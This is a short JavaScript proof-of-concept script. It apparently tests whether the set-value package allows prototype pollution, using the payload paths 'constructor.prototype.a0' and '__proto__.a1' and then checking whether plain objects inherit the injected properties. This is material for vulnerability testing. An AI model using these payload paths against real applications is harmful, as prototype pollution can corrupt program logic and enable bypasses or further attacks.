const setFn = require('set-value');
const paths = [
  'constructor.prototype.a0',
  '__proto__.a1',
];

function check() {
  for (const p of paths) {
      setFn({}, p, true);
  }
  for (let i = 0; i < paths.length; i++) {
      if (({})[`a${i}`] === true) {
          console.log(`Yes with ${paths[i]}`);
      }
  }
}

check();